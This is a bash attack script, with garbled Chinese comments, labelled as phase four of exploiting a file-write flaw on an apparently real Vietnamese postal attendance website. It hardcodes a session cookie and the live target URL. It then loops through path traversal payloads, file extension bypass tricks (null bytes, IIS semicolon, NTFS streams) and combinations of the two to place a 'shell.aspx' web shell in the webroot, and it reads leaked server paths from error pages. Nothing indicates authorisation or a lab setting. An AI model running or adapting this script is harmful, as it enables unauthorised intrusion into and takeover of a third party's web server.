#!/bin/bash

COOKIE="ASP.NET_SessionId=bezu1wgtbs241i4cyhxapaou"
BASE="http://vps.vnpost.vn/chamcong"
ID="BC01"  # ä½¿ç”¨ç¡®è®¤æœ‰æ•ˆçš„ID

echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "ğŸ”¥ Phase 4: æ–‡ä»¶å†™å…¥æ¼æ´æ·±åº¦åˆ©ç”¨"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

mkdir -p phase4_exploit && cd phase4_exploit

# è·å–ViewState
get_viewstate() {
    local id=$1
    page=$(curl -sk "${BASE}/report/inBCC.aspx?ID=${id}" -H "Cookie: $COOKIE" 2>&1)
    VS=$(echo "$page" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3)
    VG=$(echo "$page" | grep -oE '__VIEWSTATEGENERATOR" value="[^"]+' | cut -d'"' -f3)
    EV=$(echo "$page" | grep -oE '__EVENTVALIDATION" value="[^"]+' | cut -d'"' -f3)
}

# â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
echo "[1] è·¯å¾„éå†æµ‹è¯• - txtThangå‚æ•°"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

THANG_PAYLOADS=(
    "11"                                    # åŸºçº¿
    "../shell"                              # å•å±‚
    "../../shell"                           # åŒå±‚
    "../../../shell"                        # ä¸‰å±‚
    "../../../../shell"                     # å››å±‚
    "../../../../../shell"                  # äº”å±‚
    "../../../../../../inetpub/wwwroot/chamcong/shell"  # å®Œæ•´è·¯å¾„
    "11/../../../shell"                     # å‰ç¼€æ­£å¸¸å€¼
    "11/../../shell"                        # å‰ç¼€æ­£å¸¸å€¼
    "..\\shell"                             # Windowsåæ–œæ 
    "..\\..\\shell"                         # Windowsåæ–œæ 
    "..\\..\\..\\inetpub\\wwwroot\\chamcong\\shell"  # Windowså®Œæ•´è·¯å¾„
    "%2e%2e%2fshell"                        # URLç¼–ç 
    "%2e%2e%2f%2e%2e%2fshell"              # URLç¼–ç 
    "..%2fshell"                            # æ··åˆç¼–ç 
    "11%2f..%2f..%2fshell"                  # æ··åˆ
)

get_viewstate "$ID"

for i in "${!THANG_PAYLOADS[@]}"; do
    payload="${THANG_PAYLOADS[$i]}"
    echo ""
    echo "  [$((i+1))/${#THANG_PAYLOADS[@]}] txtThang='$payload'"
    
    curl -sk "${BASE}/report/inBCC.aspx?ID=${ID}" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "txtThang=$payload" \
        --data-urlencode "txtNam=2025" \
        --data-urlencode "btnExport=Export" \
        -o "thang_${i}.html" 2>&1
    
    size=$(wc -c < "thang_${i}.html")
    
    # æå–å®é™…å°è¯•å†™å…¥çš„è·¯å¾„
    path=$(grep -oE "Could not find a part of the path '[^']+'" "thang_${i}.html" | cut -d"'" -f2)
    
    if [ -n "$path" ]; then
        echo "    è·¯å¾„: $path"
        echo "$payload|$path|$size" >> path_traversal_results.txt
        
        # æ£€æŸ¥æ˜¯å¦æˆåŠŸéå†
        if [[ "$path" != *"C:\\TEMP\\"* ]]; then
            echo "    ğŸ”¥ğŸ”¥ğŸ”¥ è·¯å¾„éå†æˆåŠŸï¼çªç ´TEMPç›®å½•ï¼"
        fi
    else
        echo "    å¤§å°: $size bytes (æ— é”™è¯¯ä¿¡æ¯)"
    fi
done

# â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
echo -e "\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "[2] æ–‡ä»¶æ‰©å±•åç»•è¿‡ - txtNamå‚æ•°"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

NAM_PAYLOADS=(
    "2025"                          # åŸºçº¿
    "2025.aspx"                     # ç›´æ¥.aspx
    "2025.aspx%00"                  # ç©ºå­—èŠ‚
    "2025.aspx%00.xls"              # ç©ºå­—èŠ‚+åŸæ‰©å±•å
    "2025.aspx;.xls"                # IISåˆ†å·bypass
    "2025.asp"                      # .asp
    "2025.cer"                      # .cerä¸Šä¼ æŠ€å·§
    "2025.aspx::.xls"               # NTFSæµ
    "2025\x00.aspx"                 # ç©ºå­—èŠ‚å˜ä½“
    "aspx"                          # çº¯æ‰©å±•å
    ".aspx"                         # å¸¦ç‚¹
)

get_viewstate "$ID"

for i in "${!NAM_PAYLOADS[@]}"; do
    payload="${NAM_PAYLOADS[$i]}"
    echo ""
    echo "  [$((i+1))/${#NAM_PAYLOADS[@]}] txtNam='$payload'"
    
    curl -sk "${BASE}/report/inBCC.aspx?ID=${ID}" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "txtThang=11" \
        --data-urlencode "txtNam=$payload" \
        --data-urlencode "btnExport=Export" \
        -o "nam_${i}.html" 2>&1
    
    size=$(wc -c < "nam_${i}.html")
    path=$(grep -oE "Could not find a part of the path '[^']+'" "nam_${i}.html" | cut -d"'" -f2)
    
    if [ -n "$path" ]; then
        echo "    è·¯å¾„: $path"
        echo "$payload|$path|$size" >> extension_bypass_results.txt
        
        # æ£€æŸ¥æ‰©å±•å
        if [[ "$path" == *.aspx* ]] || [[ "$path" == *.asp* ]]; then
            echo "    ğŸ”¥ğŸ”¥ğŸ”¥ æ‰©å±•åæ³¨å…¥æˆåŠŸï¼"
        fi
    else
        echo "    å¤§å°: $size bytes (æ— é”™è¯¯ä¿¡æ¯)"
    fi
done

# â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
echo -e "\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "[3] ç»„åˆæ”»å‡»ï¼šè·¯å¾„éå† + æ‰©å±•åç»•è¿‡"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

COMBO_ATTACKS=(
    "../../shell|.aspx"
    "../../../inetpub/wwwroot/chamcong/shell|.aspx"
    "../../../../wwwroot/chamcong/x|.aspx"
    "11/../../shell|2025.aspx"
    "..\\..\\shell|.aspx"
    "..\\..\\..\\inetpub\\wwwroot\\chamcong\\shell|.aspx"
)

get_viewstate "$ID"

for i in "${!COMBO_ATTACKS[@]}"; do
    IFS='|' read thang nam <<< "${COMBO_ATTACKS[$i]}"
    echo ""
    echo "  [$((i+1))/${#COMBO_ATTACKS[@]}] txtThang='$thang' + txtNam='$nam'"
    
    curl -sk "${BASE}/report/inBCC.aspx?ID=${ID}" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "txtThang=$thang" \
        --data-urlencode "txtNam=$nam" \
        --data-urlencode "btnExport=Export" \
        -o "combo_${i}.html" 2>&1
    
    size=$(wc -c < "combo_${i}.html")
    path=$(grep -oE "Could not find a part of the path '[^']+'" "combo_${i}.html" | cut -d"'" -f2)
    
    if [ -n "$path" ]; then
        echo "    è·¯å¾„: $path"
        
        if [[ "$path" == *.aspx* ]] && [[ "$path" != *"C:\\TEMP\\"* ]]; then
            echo "    ğŸ”¥ğŸ”¥ğŸ”¥ğŸ”¥ğŸ”¥ å®Œç¾ç»„åˆï¼è·¯å¾„éå†+ASPXæ‰©å±•åï¼"
        elif [[ "$path" != *"C:\\TEMP\\"* ]]; then
            echo "    ğŸ”¥ è·¯å¾„éå†æˆåŠŸ"
        elif [[ "$path" == *.aspx* ]]; then
            echo "    ğŸ”¥ æ‰©å±•åæ³¨å…¥æˆåŠŸ"
        fi
    else
        echo "    å¤§å°: $size bytes (æ— é”™è¯¯ä¿¡æ¯)"
    fi
done

# â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
echo -e "\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "[4] IDå‚æ•°æµ‹è¯•ï¼ˆä¸åŒæŠ¥è¡¨å¯èƒ½æœ‰ä¸åŒå¤„ç†ï¼‰"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

for test_id in "BC01" "BC02" "BC03"; do
    echo ""
    echo "  æµ‹è¯• ID=$test_id + è·¯å¾„éå†..."
    
    get_viewstate "$test_id"
    
    curl -sk "${BASE}/report/inBCC.aspx?ID=${test_id}" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "txtThang=../../shell" \
        --data-urlencode "txtNam=.aspx" \
        --data-urlencode "btnExport=Export" \
        -o "id_${test_id}.html" 2>&1
    
    path=$(grep -oE "Could not find a part of the path '[^']+'" "id_${test_id}.html" | cut -d"'" -f2)
    [ -n "$path" ] && echo "    è·¯å¾„: $path"
done

echo -e "\nâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "âœ… Phase 4 å®Œæˆ"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo ""
echo "ğŸ“Š ç»“æœæ€»ç»“:"
[ -f path_traversal_results.txt ] && echo "  - è·¯å¾„éå†æµ‹è¯•: $(wc -l < path_traversal_results.txt) ä¸ªpayload"
[ -f extension_bypass_results.txt ] && echo "  - æ‰©å±•åç»•è¿‡: $(wc -l < extension_bypass_results.txt) ä¸ªpayload"
echo ""
echo "ğŸ”¥ å…³é”®å‘ç°:"
grep -h "ğŸ”¥ğŸ”¥ğŸ”¥" *.html 2>/dev/null | head -5
